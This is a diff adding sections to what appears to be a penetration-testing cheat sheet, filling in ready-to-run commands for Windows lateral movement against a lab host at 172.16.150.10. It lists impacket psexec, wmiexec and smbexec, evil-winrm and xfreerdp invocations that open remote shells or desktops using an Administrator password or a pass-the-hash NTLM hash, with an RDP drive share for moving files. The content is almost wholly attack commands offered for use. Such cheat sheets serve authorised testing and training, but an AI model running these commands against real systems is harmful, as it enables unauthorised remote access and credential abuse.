@@ -354,14 +354,43 @@ For a complete and detailed list for PowerView.ps1 check the following link:
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
 ### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
 ```shell
+# Using Password
+# impacket-psexec with password
+impacket-psexec Administrator:'Password123!'@172.16.150.10
+impacket-psexec vorkharium.com/Administrator:'Password123!'@172.16.150.10
+# impacket-wmiexec with password
+impacket-wmiexec Administrator:'Password123!'@172.16.150.10
+impacket-wmiexec vorkharium.com/Administrator:'Password123!'@172.16.150.10
+# impacket-smbexec with password
+impacket-smbexec Administrator:'Password123!'@172.16.150.10
+impacket-smbexec vorkharium.com/Administrator:'Password123!'@172.16.150.10
 
+# Using Hash (Pass-the-Hash)
+# impacket-psexec with hash
+impacket-psexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
+impacket-psexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
+# impacket-wmiexec with hash
+impacket-wmiexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
+impacket-wmiexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
+# impacket-smbexec with hash
+impacket-smbexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
+impacket-smbexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
 ```
 ### Evil-WinRM - Access WinRM with Password or Pass-the-Hash
 ```shell
-
+# With Password
+evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'
+# With Hash
+evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
 ```
 ### xfreerdp - Access RDP with Password or Pass-the-Hash
 ```shell
+# Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session
+# Example 1
+xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
+sudo xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
+# Example 2
+xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share
 
 ```
 ### Kerberoasting with Impacket
